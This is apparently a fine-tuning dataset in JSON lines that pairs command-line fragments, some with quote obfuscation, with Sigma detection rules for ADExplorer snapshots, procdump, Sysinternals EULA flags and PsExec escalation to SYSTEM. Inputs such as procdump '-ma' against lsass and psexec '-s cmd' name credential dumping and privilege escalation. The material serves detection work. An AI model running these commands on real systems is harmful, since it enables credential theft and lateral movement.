{"instruction": "Write Sigma rule to detect payload:", "input": "\\ADExplorer.exe AdExp \"snap\"shot", "output": "title: Active Directory Database Snapshot Via ADExplorer\nid: 9212f354-7775-4e28-9c9f-8f0a4544e664\nrelated:\n    - id: ef61af62-bc74-4f58-b49b-626448227652\n      type: derived\nstatus: test\ndescription: Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.\nreferences:\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.credential-access\n    - attack.t1552.001\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ADExplorer AdExp snapshot", "output": "title: Active Directory Database Snapshot Via ADExplorer\nid: 9212f354-7775-4e28-9c9f-8f0a4544e664\nrelated:\n    - id: ef61af62-bc74-4f58-b49b-626448227652\n      type: derived\nstatus: test\ndescription: Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.\nreferences:\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.credential-access\n    - attack.t1552.001\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ADExplorer.exe snapshot AdExp", "output": "title: Active Directory Database Snapshot Via ADExplorer\nid: 9212f354-7775-4e28-9c9f-8f0a4544e664\nrelated:\n    - id: ef61af62-bc74-4f58-b49b-626448227652\n      type: derived\nstatus: test\ndescription: Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.\nreferences:\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.credential-access\n    - attack.t1552.001\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-accepteula", "output": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-accepteula", "output": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-accepteula", "output": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\procdump.exe \\procdump64.exe", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\procdump.exe \\procdu\\\"mp64.exe\\\"", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\procdump \\procdump64", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\procdump.exe \\procdump64.exe", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "copy procdump move procdump copy .dmp 2.dmp lsass out.dmp copy lsass.exe_ move lsass.exe_", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "copy procdump move procdump copy .d\\\"mp\\\" 2.dmp lsass out.dmp copy lsass.exe_ move lsass.exe_", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "copy procdump move procdump copy .dmp 2.dmp lsass out.dmp copy lsass.exe_ move lsass.exe_", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-ma ls", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-ma \"l\"\"s\"", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-ma ls", "output": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\psexec.exe psexec.c", "output": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\psexec.exe \\\"psex\\\"ec.c", "output": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\psexec psexec.c", "output": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\psexec.exe psexec.c", "output": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell -s -i powershell -i -s powershell psexec paexec accepteula", "output": "title: PsExec/PAExec Escalation to LOCAL SYSTEM\nid: 8834e2f7-6b4b-4f09-8906-d2276470ee23\nrelated:\n    - id: 207b0396-3689-42d9-8399-4222658efc99 # Generic rule based on similar cli flags\n      type: similar\nstatus: test\ndescription: Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-11-23\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sys: # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    selection_other:\n        CommandLine|contains:\n            - 'psexec'\n            - 'paexec'\n            - 'accepteula'\n    condition: all of selection_*\nfalsepositives:\n    - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)\n    - Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell \\\"-s\\\" \\\"-i\\\" powershell -i -s powershell psexec paexec accepteula", "output": "title: PsExec/PAExec Escalation to LOCAL SYSTEM\nid: 8834e2f7-6b4b-4f09-8906-d2276470ee23\nrelated:\n    - id: 207b0396-3689-42d9-8399-4222658efc99 # Generic rule based on similar cli flags\n      type: similar\nstatus: test\ndescription: Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-11-23\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sys: # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    selection_other:\n        CommandLine|contains:\n            - 'psexec'\n            - 'paexec'\n            - 'accepteula'\n    condition: all of selection_*\nfalsepositives:\n    - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)\n    - Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell -s -i powershell -i -s powershell psexec paexec accepteula", "output": "title: PsExec/PAExec Escalation to LOCAL SYSTEM\nid: 8834e2f7-6b4b-4f09-8906-d2276470ee23\nrelated:\n    - id: 207b0396-3689-42d9-8399-4222658efc99 # Generic rule based on similar cli flags\n      type: similar\nstatus: test\ndescription: Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-11-23\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sys: # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    selection_other:\n        CommandLine|contains:\n            - 'psexec'\n            - 'paexec'\n            - 'accepteula'\n    condition: all of selection_*\nfalsepositives:\n    - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)\n    - Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "accepteula -u -p \\\\\\\\", "output": "title: Potential PsExec Remote Execution\nid: ea011323-7045-460b-b2d7-0f7442ea6b38\nstatus: test\ndescription: Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Accepting EULA in commandline - often used in automated attacks\n        CommandLine|contains|all:\n            - 'accepteula'\n            - ' -u '\n            - ' -p '\n            - ' \\\\\\\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "accepteula \"-u\" \"-p\" \\\\\\\\", "output": "title: Potential PsExec Remote Execution\nid: ea011323-7045-460b-b2d7-0f7442ea6b38\nstatus: test\ndescription: Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Accepting EULA in commandline - often used in automated attacks\n        CommandLine|contains|all:\n            - 'accepteula'\n            - ' -u '\n            - ' -p '\n            - ' \\\\\\\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "accepteula -u \\\\\\\\ -p", "output": "title: Potential PsExec Remote Execution\nid: ea011323-7045-460b-b2d7-0f7442ea6b38\nstatus: test\ndescription: Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Accepting EULA in commandline - often used in automated attacks\n        CommandLine|contains|all:\n            - 'accepteula'\n            - ' -u '\n            - ' -p '\n            - ' \\\\\\\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell -s -i powershell -i -s powershell paexec PsExec accepteula", "output": "title: Potential Privilege Escalation To LOCAL SYSTEM\nid: 207b0396-3689-42d9-8399-4222658efc99\nrelated:\n    - id: 8834e2f7-6b4b-4f09-8906-d2276470ee23 # PsExec specific rule\n      type: similar\nstatus: test\ndescription: Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-05-22\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    filter_main_exclude_coverage:\n        # This filter exclude strings covered by 8834e2f7-6b4b-4f09-8906-d2276470ee23\n        CommandLine|contains:\n            - 'paexec'\n            - 'PsExec'\n            - 'accepteula'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell \"-s\" -i powershell -i -s powershell paexec PsExec accepteula", "output": "title: Potential Privilege Escalation To LOCAL SYSTEM\nid: 207b0396-3689-42d9-8399-4222658efc99\nrelated:\n    - id: 8834e2f7-6b4b-4f09-8906-d2276470ee23 # PsExec specific rule\n      type: similar\nstatus: test\ndescription: Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-05-22\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    filter_main_exclude_coverage:\n        # This filter exclude strings covered by 8834e2f7-6b4b-4f09-8906-d2276470ee23\n        CommandLine|contains:\n            - 'paexec'\n            - 'PsExec'\n            - 'accepteula'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing\nlevel: high"}
